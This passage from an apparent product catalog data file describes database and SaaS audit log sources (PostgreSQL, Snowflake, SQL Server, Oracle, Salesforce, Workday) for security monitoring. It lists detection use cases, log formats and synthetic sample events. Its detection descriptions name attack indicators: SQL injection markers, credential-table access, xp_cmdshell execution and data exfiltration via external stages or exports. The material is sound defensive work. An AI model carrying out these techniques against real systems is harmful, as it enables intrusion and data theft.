        description: 'Statement-level and object-level audit logging for PostgreSQL via the pgAudit extension. Captures DDL, DML, role operations, and function calls with full SQL statement text, object names, and execution parameters. Integrates with PostgreSQL native logging infrastructure.',
        status: 'available',
        useCases: ['Database Access Auditing', 'SQL Injection Detection', 'Privilege Escalation Monitoring', 'Schema Change Tracking', 'Compliance Reporting', 'Slow Query Analysis', 'Connection Monitoring'],
        personas: ['SOC', 'Security Engineering', 'DBA', 'Compliance', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect SQL injection patterns by analyzing pgAudit WRITE/DDL statements for suspicious syntax — UNION SELECT, information_schema queries, and pg_shadow/pg_authid access from application accounts' },
            { persona: 'Data End User / Analyst', job: 'Identify privilege escalation by tracking ROLE class events showing unexpected GRANT statements or ALTER ROLE with SUPERUSER/CREATEROLE attributes' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Satisfy SOX/PCI-DSS database audit requirements with complete statement-level logging of all DDL and privileged DML operations on sensitive tables' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing all access to PII tables with user, timestamp, statement type, and row counts for data privacy audits' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter READ class events on non-sensitive tables (often 90%+ of pgAudit volume) while preserving WRITE, DDL, and ROLE events — reducing database audit log volume by 80-90%' },
            { persona: 'Data Engineer', job: 'Route DDL/ROLE events and failed statements to SIEM for real-time detection while batching full audit trail to Lake for compliance retention' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure pgAudit extension (shared_preload_libraries), set pgaudit.log classes, and connect PostgreSQL log output (csvlog or syslog) to Cribl Stream within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (PostgreSQL csvlog) / Syslog / CloudWatch Logs (RDS) / Azure Diagnostic Logs (Azure DB for PostgreSQL)',
        logFormat: 'CSV or syslog — pgAudit appends structured fields to PostgreSQL log_line_prefix: AUDIT: <audit_type>,<statement_id>,<substatement_id>,<class>,<command>,<object_type>,<object_name>,<statement>,<parameter>. Classes: READ, WRITE, DDL, ROLE, FUNCTION, MISC.',
        avgEPS: '5,000-100,000 EPS (READ logging on busy OLTP systems generates massive volume; DDL/ROLE events are very low)',
        sampleEvent: '2026-06-16 14:32:08.234 UTC [12345] mthompson@production LOG:  AUDIT: SESSION,1,1,WRITE,UPDATE,TABLE,public.users,"UPDATE users SET password_hash = $1 WHERE email = $2",<hidden>'
      },
      {
        id: 'snowflake-audit',
        name: 'Snowflake Access History & Query Logs',
        vendor: 'Snowflake',
        description: 'Audit and operational telemetry from Snowflake Data Cloud via the ACCOUNT_USAGE and INFORMATION_SCHEMA views. Captures ACCESS_HISTORY (who accessed what data, column-level lineage), QUERY_HISTORY (every SQL statement with execution metrics), LOGIN_HISTORY (authentication events), WAREHOUSE_EVENTS_HISTORY (scaling, suspend/resume), and SESSION_HISTORY. Provides both security audit and FinOps/performance visibility into the modern cloud data warehouse.',
        status: 'available',
        useCases: ['Data Access Auditing', 'Sensitive Data Access Monitoring', 'Credential Compromise Detection', 'Query Performance Analysis', 'Warehouse Credit Optimization', 'Data Exfiltration Detection', 'Compliance Reporting', 'Cost Attribution', 'Anomalous Query Detection', 'Role Privilege Escalation'],
        personas: ['Security Engineering', 'SOC', 'Data Engineering', 'DBA', 'FinOps', 'Compliance', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect data exfiltration by identifying queries selecting from tables tagged as PII/PHI with COPY INTO or GET commands to external stages, or abnormally large result sets from non-service-account users outside business hours' },
            { persona: 'Data End User / Analyst', job: 'Investigate credential compromise by correlating LOGIN_HISTORY anomalies (new client IP, unusual client application, geographic impossibility) with subsequent ACCESS_HISTORY showing first-time access to sensitive databases' },
            { persona: 'Data Content Creator', job: 'Build privilege escalation detections by monitoring GRANT statements in QUERY_HISTORY that elevate roles to ACCOUNTADMIN or SYSADMIN, or create new users with broad database access' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor warehouse auto-scaling events, query queuing, and credit consumption trends to detect runaway queries or misconfigured auto-suspend policies burning credits unnecessarily' },
            { persona: 'Data End User / Analyst', job: 'Identify slow queries by analyzing QUERY_HISTORY execution times, bytes scanned, and partition pruning effectiveness to optimize data pipeline performance' },
            { persona: 'NOC', job: 'Track warehouse credit consumption by team/department using resource monitors and alert when weekly spend exceeds allocated budgets by 20%+' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume SELECT query completions on non-sensitive internal tables (often 80%+ of QUERY_HISTORY volume) while preserving DDL, GRANT, COPY, and queries touching tagged PII tables for security and compliance' },
            { persona: 'Data Engineer', job: 'Route LOGIN_HISTORY failures, GRANT operations, and external stage access to SIEM for real-time detection while batching full QUERY_HISTORY to Lake for FinOps credit attribution and query optimization' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain column-level access audit trail via ACCESS_HISTORY showing exactly which users and roles accessed PII columns, satisfying GDPR Article 30 and CCPA data processing requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate data governance reports showing access patterns to sensitive datasets by role, user, and time period for quarterly privacy reviews and SOC 2 evidence collection' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Snowflake event table sharing or ACCOUNT_USAGE view polling via Cribl REST Collector (Snowflake SQL API) with role-based access to audit views within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3', 'Datadog'],
        collectionMethod: 'Snowflake SQL API (REST Collector) / Event Table (share to external account) / Snowpipe Streaming / ACCOUNT_USAGE view polling',
        logFormat: 'JSON (from SQL API or Event Table). Key views: QUERY_HISTORY (query_id, query_text, user_name, role_name, warehouse_name, execution_status, bytes_scanned, rows_produced, credits_used, start_time, end_time), LOGIN_HISTORY (event_timestamp, user_name, client_ip, reported_client_type, first_authentication_factor, is_success, error_code), ACCESS_HISTORY (query_id, user_name, direct_objects_accessed[].objectName, base_objects_accessed[].columns[].columnName).',
        avgEPS: '1,000-100,000 EPS depending on warehouse activity and query volume (ACCESS_HISTORY generates records per query per accessed object)',
        sampleEvent: '{"query_id":"01b23c45-0001-abcd-0000-000123456789","query_text":"SELECT ssn, full_name, email FROM production.customers.pii_table WHERE state = \'CA\' LIMIT 50000","user_name":"MTHOMPSON","role_name":"DATA_ANALYST","warehouse_name":"ANALYTICS_WH","database_name":"PRODUCTION","schema_name":"CUSTOMERS","execution_status":"SUCCESS","bytes_scanned":15234567890,"rows_produced":50000,"total_elapsed_time":12345,"credits_used_cloud_services":0.023,"start_time":"2026-06-17T14:32:08.234Z","end_time":"2026-06-17T14:32:20.579Z","client_application_id":"Tableau","session_id":"98765432"}'
      },
      {
        id: 'mssql-audit',
        name: 'Microsoft SQL Server Audit',
        vendor: 'Microsoft',
        description: 'SQL Server Audit events captured via server-level and database-level audit specifications. Covers login events, permission changes, schema modifications (DDL), data access (SELECT/INSERT/UPDATE/DELETE on sensitive tables), stored procedure execution, backup/restore operations, and security principal changes. Available on SQL Server on-premises, Azure SQL Database, and Azure SQL Managed Instance.',
        status: 'available',
        useCases: ['SQL Injection Detection', 'Privilege Escalation Monitoring', 'Unauthorized Data Access', 'Schema Change Tracking', 'Backup Exfiltration Detection', 'Login Brute Force', 'Compliance Auditing', 'Deadlock Monitoring', 'Connection Pool Health', 'Query Performance Degradation'],
        personas: ['SOC', 'Security Engineering', 'DBA', 'Compliance', 'Platform Engineering', 'Application Development'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect SQL injection by monitoring audit events for dynamic SQL execution with suspicious patterns — EXEC(xp_cmdshell), OPENROWSET to external sources, or information_schema enumeration from application service accounts' },
            { persona: 'Data End User / Analyst', job: 'Identify privilege escalation by tracking ALTER ROLE, sp_addsrvrolemember, and GRANT WITH GRANT OPTION events that add users to sysadmin or db_owner roles outside change windows' },
            { persona: 'Data Content Creator', job: 'Detect backup exfiltration by alerting on BACKUP DATABASE commands targeting non-standard paths (UNC paths, unusual drives) or backup operations initiated by non-DBA accounts' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor login failure rates, connection counts, and deadlock events to detect application connectivity issues and database resource contention before they cascade into outages' },
            { persona: 'Data End User / Analyst', job: 'Track query execution statistics via Extended Events to identify regressed query plans, blocking chains, and tempdb contention affecting application response times' },
            { persona: 'DBA', job: 'Detect long-running transactions and open cursors that are holding locks and causing blocking cascades across dependent applications' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter successful SELECT audit events on non-sensitive tables and routine health check logins (typically 75-90% of SQL Server audit volume) while preserving DDL, failed logins, permission changes, and access to PII/PHI tables' },
            { persona: 'Data Engineer', job: 'Route failed logins, DDL changes, and sensitive table access to SIEM for real-time detection while streaming full audit trail and Extended Events to Lake for compliance retention and performance analysis' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Satisfy SOX Section 404 and PCI-DSS Requirement 10 with complete database access audit trail covering all privileged operations on financial and cardholder data tables' },
            { persona: 'Data End User / Analyst', job: 'Generate periodic access review reports showing all users who accessed sensitive tables (dynamic data masking exceptions, unmasked column reads) for data privacy compliance' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure SQL Server Audit with server and database specifications targeting security-relevant event groups, output to file or Windows Event Log, and connect to Cribl Stream via file monitor or WEF within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (.sqlaudit files) / Windows Event Log (Application) / Extended Events (XEL files) / Azure Diagnostic Logs / Syslog (Linux SQL Server)',
        logFormat: 'Binary .sqlaudit (fn_get_audit_file reads as tabular) or XML (Extended Events). Key fields: event_time, action_id (AUSC, LGIF, LGIS, AL, DL, IN, UP, SL, EX, DBCC), server_principal_name, database_name, schema_name, object_name, statement, succeeded, session_id, client_ip, application_name, host_name. Azure SQL: JSON via Diagnostic Logs.',
        avgEPS: '5,000-500,000 EPS (SELECT auditing on busy OLTP systems generates extreme volume; DDL/login events are much lower)',
        sampleEvent: '{"event_time":"2026-06-17T14:32:08.234Z","action_id":"SL","action_name":"SELECT","succeeded":true,"server_principal_name":"app_svc_web","database_name":"Production","schema_name":"dbo","object_name":"Customers","statement":"SELECT TOP 50000 SSN, FullName, Email, CreditCardNumber FROM dbo.Customers WHERE State = \'CA\'","additional_information":"","client_ip":"10.0.1.55","application_name":"WebAPI-Prod","host_name":"APP-SERVER-03","session_id":567,"transaction_id":12345678,"sequence_number":1,"is_column_permission":true,"object_id":1234567890}'
      },
      {
        id: 'oracle-unified-audit',
        name: 'Oracle Database Unified Audit',
        vendor: 'Oracle',
        description: 'Unified Audit Trail from Oracle Database capturing all auditable activities in a single repository (UNIFIED_AUDIT_TRAIL view). Covers privilege usage, object access (Fine-Grained Auditing), Data Pump exports, RMAN operations, SQL*Loader, Oracle Data Guard, and Real Application Security events. Available on Oracle 12c+ (on-premises), Oracle Autonomous Database, and Oracle Cloud Infrastructure (OCI) Database.',
        status: 'available',
        useCases: ['Privileged Access Monitoring', 'Fine-Grained Data Access Auditing', 'Data Pump Export Detection', 'SYSDBA/SYSOPER Tracking', 'SQL Injection Detection', 'Schema Change Auditing', 'Database Link Abuse', 'Tablespace/Capacity Monitoring', 'Session Performance', 'Compliance Reporting'],
        personas: ['SOC', 'Security Engineering', 'DBA', 'Compliance', 'Platform Engineering', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect data exfiltration via Oracle Data Pump (expdp) by alerting on EXPORT operations targeting schemas containing sensitive tables, especially when initiated by non-DBA accounts or targeting non-standard directory objects' },
            { persona: 'Data End User / Analyst', job: 'Investigate privilege abuse by correlating SYSDBA/SYSOPER logon events with subsequent DDL operations, direct table access bypassing application layer, and ALTER SYSTEM commands outside maintenance windows' },
            { persona: 'Data Content Creator', job: 'Build Fine-Grained Audit detections for SELECT access to sensitive columns (SSN, credit card, salary) by non-application accounts, with column-level granularity unavailable in standard auditing' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor database health by tracking session counts, tablespace utilization, redo log switches, and Data Guard sync lag from audit trail metadata and alert events' },
            { persona: 'Data End User / Analyst', job: 'Identify performance-impacting operations by analyzing long-running queries, excessive parse counts, and latch contention indicators from audit trail execution statistics' },
            { persona: 'DBA', job: 'Track space management events (tablespace autoextend, segment growth, temp space exhaustion) and correlate with application batch windows to predict capacity needs' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter successful SELECT audits on non-sensitive application schemas (typically 80-90% of unified audit volume) while preserving FGA policy triggers, DDL, privilege use, and Data Pump/RMAN events' },
            { persona: 'Data Engineer', job: 'Route SYSDBA access, FGA alerts, privilege escalation, and Data Pump events to SIEM for real-time detection while streaming full unified audit trail to Lake for SOX/PCI compliance retention' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Satisfy SOX Section 404, PCI-DSS Requirement 10, and HIPAA by maintaining tamper-proof audit trail of all privileged operations, sensitive data access, and schema modifications with 7-year retention' },
            { persona: 'Data End User / Analyst', job: 'Generate quarterly Privilege Analysis reports showing actual privilege usage versus granted privileges to support least-privilege remediation across database accounts' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Unified Audit policies (CREATE AUDIT POLICY), enable audit trail write mode (QUEUED/IMMEDIATE), and set up syslog or file-based export to Cribl Stream within 30 minutes per database' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (DBMS_AUDIT_MGMT) / File monitor (OS audit trail) / Oracle Audit Vault / OCI Audit service / JDBC query (UNIFIED_AUDIT_TRAIL view)',
        logFormat: 'Structured records from UNIFIED_AUDIT_TRAIL view — key columns: EVENT_TIMESTAMP, DBUSERNAME, ACTION_NAME, OBJECT_SCHEMA, OBJECT_NAME, SQL_TEXT, RETURN_CODE, OS_USERNAME, USERHOST, TERMINAL, AUTHENTICATION_TYPE, DBPROXY_USERNAME, CURRENT_USER, FGA_POLICY_NAME, UNIFIED_AUDIT_POLICIES. OCI delivers JSON.',
        avgEPS: '5,000-500,000 EPS (Fine-Grained Auditing on busy schemas generates extreme volume; privilege/DDL events are relatively low)',
        sampleEvent: '{"EVENT_TIMESTAMP":"2026-06-17T14:32:08.234Z","DBUSERNAME":"APP_BATCH_USER","ACTION_NAME":"SELECT","OBJECT_SCHEMA":"HR","OBJECT_NAME":"EMPLOYEES","SQL_TEXT":"SELECT EMPLOYEE_ID, SSN, SALARY, BANK_ACCOUNT FROM HR.EMPLOYEES WHERE DEPARTMENT_ID = 50","RETURN_CODE":0,"OS_USERNAME":"oracle","USERHOST":"batch-server-03.corp.internal","AUTHENTICATION_TYPE":"DATABASE","UNIFIED_AUDIT_POLICIES":"SENSITIVE_DATA_ACCESS","FGA_POLICY_NAME":"HR_PII_ACCESS","CURRENT_USER":"APP_BATCH_USER","SESSION_ID":12345,"INSTANCE_ID":1,"DBID":9876543210}'
      }
    ]
  },
  {
    category: 'SaaS Applications',
    icon: '📱',
    sources: [
      {
        id: 'salesforce-events',
        name: 'Salesforce Event Monitoring',
        vendor: 'Salesforce',
        description: 'Enterprise event monitoring logs from the Salesforce platform capturing Login events, API calls, Report Exports, Lightning page views, URI events, Bulk API operations, Apex execution, SOQL queries, and data export/download events. Delivered via the EventLogFile API (hourly/daily files) or Real-Time Event Monitoring (streaming). Provides complete visibility into who is accessing what data and how across the Salesforce org.',
        status: 'available',
        useCases: ['Data Exfiltration Detection', 'Account Takeover Detection', 'API Abuse Monitoring', 'Report Export Surveillance', 'Excessive Data Access', 'Login Anomaly Detection', 'Permission Escalation', 'Shadow Admin Detection', 'License Utilization', 'API Limit Monitoring', 'Compliance Auditing'],
        personas: ['SOC', 'Security Engineering', 'Salesforce Administration', 'Compliance', 'Data Protection', 'IT Operations', 'RevOps'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect data exfiltration by identifying mass report exports (>10K rows), Bulk API data downloads, or Data Loader extractions from users whose role does not require bulk data access — correlate with login anomalies for high-confidence alerts' },
            { persona: 'Data End User / Analyst', job: 'Investigate account takeover by correlating Salesforce login events showing unusual client IP, browser fingerprint, or geographic location with subsequent permission set assignments or connected app authorizations' },
            { persona: 'Data Content Creator', job: 'Build shadow admin detection by monitoring SetupAuditTrail and Login events for users accessing Setup pages or modifying profiles/permission sets without the System Administrator profile' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor API usage against org limits by tracking total API calls, concurrent API requests, and Bulk API batch counts — alert when consumption exceeds 80% of daily limits with 4+ hours remaining in the window' },
            { persona: 'Data End User / Analyst', job: 'Track Lightning Experience page load performance using Lightning Performance events and identify slow components or integrations degrading user experience across the org' },
            { persona: 'NOC', job: 'Detect Salesforce service degradation by monitoring login failure rates, API timeout events, and Apex governor limit exceptions before users report issues' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume Lightning page view and URI events (often 70-80% of EventLogFile volume) while preserving Login, API, ReportExport, BulkAPI, and ApexExecution events for security analysis — reducing Salesforce event log ingest by 65-75%' },
            { persona: 'Data Engineer', job: 'Route ReportExport, BulkAPI, LoginAs, and permission change events to SIEM for real-time detection while batching full EventLogFile data to Lake for compliance retention and usage analytics' },
            { persona: 'Team Leader', job: 'Justify Salesforce Shield Event Monitoring license cost by demonstrating security detections and compliance reporting enabled by the event data across multiple downstream analytics platforms' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all data access, exports, and permission changes to satisfy SOC 2, HIPAA, and financial services regulatory requirements for CRM data governance' },
            { persona: 'Data End User / Analyst', job: 'Generate quarterly access review reports showing all users who accessed Opportunity Amount fields, exported Contact PII, or ran reports on financial objects with row counts and export formats' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Salesforce EventLogFile API collection via Cribl REST Collector with OAuth 2.0 JWT bearer flow authentication, or Real-Time Event Monitoring via CometD streaming — operational within 45 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'EventLogFile REST API (Cribl REST Collector with OAuth 2.0 JWT) / Real-Time Event Monitoring (CometD/Pub-Sub API) / Event Bus (Platform Events)',
        logFormat: 'CSV (EventLogFile hourly/daily downloads) or JSON (Real-Time Event Monitoring streaming). Key event types: Login, API, ReportExport, BulkAPI, URI, LightningPageView, ApexExecution, ContentTransfer, LoginAs, WaveChange. Fields vary by type but include TIMESTAMP, USER_ID, USER_NAME, SOURCE_IP, URI, OPERATION, ENTITY_NAME, ROWS_PROCESSED, CLIENT_ID, LOGIN_STATUS, API_TYPE, REQUEST_SIZE, RESPONSE_SIZE, RUN_TIME.',
        avgEPS: '5,000-500,000 EPS depending on org size and licensed event types (Login and API events are always highest volume; LightningPageView adds significantly when enabled)',
        sampleEvent: '{"EVENT_TYPE":"ReportExport","TIMESTAMP":"2026-06-17T14:32:08.000Z","USER_ID":"005xx000001abcDEF","USER_NAME":"mthompson@cribl.io","SOURCE_IP":"203.0.113.42","URI":"/00Oxx000000abcDEF","OPERATION":"ReportExported","ENTITY_NAME":"All Customers with Revenue > 1M","ROWS_PROCESSED":"47523","DISPLAY_TYPE":"csv","CLIENT_ID":"Dataloader-Batch","LOGIN_KEY":"abcdef123456","SESSION_KEY":"WvtsJ1234567","ORGANIZATION_ID":"00Dxx0000001gER","REQUEST_ID":"4abc-def-7890","RUN_TIME":"3456","CPU_TIME":"2100","DB_TOTAL_TIME":"15000000","REQUEST_SIZE":"245","RESPONSE_SIZE":"15234567"}'
      },
      {
        id: 'workday-audit',
        name: 'Workday Audit Logs',
        vendor: 'Workday',
        description: 'Workday User Activity Logging captures all system interactions including configuration changes, security policy modifications, business process executions, report runs, and data access events. Includes System Auditing (task-level), User Activity (session and object-level), and Login Audit trails. Available via Workday Report-as-a-Service (RaaS) REST API or Workday Prism Analytics Data Change API.',
        status: 'available',
        useCases: ['Privileged Configuration Change Detection', 'Mass Data Export Monitoring', 'Segregation of Duties Violations', 'Unauthorized Report Access', 'Business Process Abuse', 'Account Lifecycle Auditing', 'Session Anomaly Detection', 'Payroll Modification Tracking', 'Integration Credential Usage', 'Compliance Reporting'],
        personas: ['SOC', 'Security Engineering', 'HR Security', 'Compliance', 'Internal Audit', 'IT Operations'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect unauthorized payroll modifications by alerting on Compensation Change or Payment Election Change business processes initiated by users outside of HR Payroll security groups, especially bulk changes or self-service modifications exceeding thresholds' },
            { persona: 'Data End User / Analyst', job: 'Investigate data exfiltration patterns by correlating mass report executions, large custom report runs (high row counts), and Worker Data export events from the same user session — especially targeting compensation, SSN, or banking fields' },
            { persona: 'Data Content Creator', job: 'Build segregation of duties alerting by detecting when users with Hire/Terminate permissions also access Payroll Input or when Security Administrators modify their own access groups' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Workday integration system user (ISU) activity to detect stalled integrations, excessive API calls approaching rate limits, and authentication failures that may interrupt critical payroll or benefits data flows' },
            { persona: 'Data End User / Analyst', job: 'Track business process completion rates and cycle times (hire-to-active, promotion approval chains, termination workflows) to identify process bottlenecks and SLA violations' },
            { persona: 'IT Operations', job: 'Detect Workday configuration drift by monitoring Security Policy changes, Custom Report modifications, and Business Process Definition updates that may impact downstream integrations or compliance posture' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume successful GET/View operations on non-sensitive objects (typically 85-90% of User Activity logs) while preserving all modification events, report executions, security changes, and access to compensation/PII fields' },
            { persona: 'Data Engineer', job: 'Route security-relevant events (login anomalies, privilege changes, payroll modifications, mass exports) to SIEM for real-time detection while streaming full audit trail to Lake for SOX/SOC 2 compliance retention' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Satisfy SOX Section 302/404, SOC 2 CC6.1, and GDPR Article 30 by maintaining complete audit trail of all configuration changes, data access, and business process executions with configurable retention exceeding Workday native 30-day window' },
            { persona: 'Internal Audit', job: 'Generate quarterly access review evidence by reporting all users who accessed Worker objects containing SSN, compensation, or banking data alongside their security group assignments and business justification' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Workday RaaS (Report-as-a-Service) custom report extraction via Cribl REST Collector with WS-Security or OAuth 2.0 authentication — polling User Activity and System Auditing data sources on 5-minute intervals' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (Report-as-a-Service / RaaS) via Cribl REST Collector / Workday Prism Analytics API / Workday SIEM Integration (preview)',
        logFormat: 'JSON or XML (RaaS output). Key fields: System_Account, Target_Worker, Task_Display_Name, Business_Process_Type, Activity_Action (LOGIN, CHANGE, VIEW, REPORT_RUN), Session_ID, IP_Address, Device_Type, Security_Group, Object_Type, Field_Changes (before/after values), Row_Count_Returned, Report_Name, Timestamp.',
        avgEPS: '2,000-200,000 EPS depending on tenant size and enabled audit categories (User Activity logging on large tenants with compensation access tracking generates highest volume)',
        sampleEvent: '{"Timestamp":"2026-06-17T14:32:08.000Z","System_Account":"jgarcia@cribl","Activity_Action":"REPORT_RUN","Task_Display_Name":"Run Custom Report","Report_Name":"All Active Workers - Full Compensation","Row_Count_Returned":12847,"Target":"Custom Report","IP_Address":"203.0.113.42","Session_ID":"sess-abc123-def456","Device_Type":"Desktop - Chrome 125","Security_Group":"HR_Compensation_Analyst","Business_Process_Type":"","Object_Type":"Worker","Field_Path":"Worker.Compensation.Total_Base_Pay,Worker.Personal_Data.SSN","Tenant":"cribl-prod-1"}'
      },
      {
        id: 'workday-integration-prism',
        name: 'Workday Integration & Prism Analytics',
        vendor: 'Workday',
        description: 'Workday Integration Events capture execution logs from Enterprise Interface Builder (EIB), Studio Integrations, Cloud Connect, and Document Transformation connectors. Prism Analytics audit logs track dataset access, pipeline executions, dashboard views, and data source ingestion events. Together these provide visibility into all automated data movement in and out of Workday plus analytical workload monitoring.',
        status: 'available',
        useCases: ['Integration Failure Detection', 'Data Pipeline Health Monitoring', 'Credential Rotation Compliance', 'Unauthorized Integration Creation', 'Prism Dataset Access Auditing', 'ETL Performance Monitoring', 'Integration Rate Limit Tracking', 'Data Volume Anomaly Detection', 'SLA Compliance for Payroll Feeds', 'Analytics Usage Reporting'],
        personas: ['Platform Engineering', 'IT Operations', 'Data Engineering', 'Security Engineering', 'Compliance', 'HR Technology'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect unauthorized integration creation by alerting on new Integration System Users (ISUs) or Studio Integration launches initiated outside the Integration team security group, especially those targeting Worker, Payroll, or Compensation business objects' },
            { persona: 'Data End User / Analyst', job: 'Investigate data exfiltration via integrations by correlating EIB/Studio executions that output to external SFTP endpoints or cloud storage with unusual record counts exceeding historical baselines or targeting fields not previously included' },
            { persona: 'Security Engineering', job: 'Monitor integration credential usage patterns to detect compromised ISU accounts — alert on integrations running from new IP ranges, outside expected schedules, or with unusual API call sequences' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Build real-time integration health dashboard showing success/failure/running status across all scheduled and triggered integrations — highlighting payroll, benefits, and time-tracking critical path integrations that require immediate remediation' },
            { persona: 'Data Engineer', job: 'Monitor Prism Analytics pipeline execution times, dataset refresh completions, and data source ingestion lag to ensure analytics dashboards reflect current operational data within SLA thresholds' },
            { persona: 'IT Operations', job: 'Track Workday API rate limit consumption across all ISUs and integration types to prevent throttling that would impact critical HR business processes — alert at 70% utilization threshold' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter repetitive integration heartbeat/polling events and successful no-change executions (often 60-70% of integration log volume) while preserving failure events, record count changes, configuration modifications, and timing data' },
            { persona: 'Data Engineer', job: 'Route integration failures, credential events, and unauthorized integration creation to SIEM for alerting while streaming full execution history to Lake for trend analysis and capacity planning' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Demonstrate compliance with data processing agreements (DPAs) by maintaining audit trail of all automated data exports from Workday — showing which fields were extracted, record counts, destination systems, and responsible ISU accounts' },
            { persona: 'Internal Audit', job: 'Verify integration credential rotation compliance by reporting ISUs whose credentials exceed 90-day rotation policy, and correlating with integration execution frequency to assess blast radius of compromised credentials' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure integration event collection via Workday RaaS reports targeting Integration Event data source (polling) or enable Workday Activity Logging API for near-real-time integration audit streaming to Cribl Stream' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3', 'Snowflake'],
        collectionMethod: 'REST API (RaaS - Integration Events report / Prism Analytics API) via Cribl REST Collector / Workday Activity Logging API (streaming)',
        logFormat: 'JSON (RaaS/API output). Integration events: Integration_Name, Integration_System_User, Execution_Status (Completed/Failed/Running), Start_Time, End_Time, Records_Processed, Records_Failed, Output_Endpoint, Error_Message, Integration_Type (EIB/Studio/Cloud_Connect). Prism events: Dataset_Name, Pipeline_Name, Execution_Duration_ms, Records_Ingested, User, Action (VIEW/REFRESH/CREATE/SHARE), Data_Source_Type.',
        avgEPS: '500-50,000 EPS depending on integration count and Prism Analytics adoption (organizations with 100+ active integrations on hourly schedules approach higher range)',
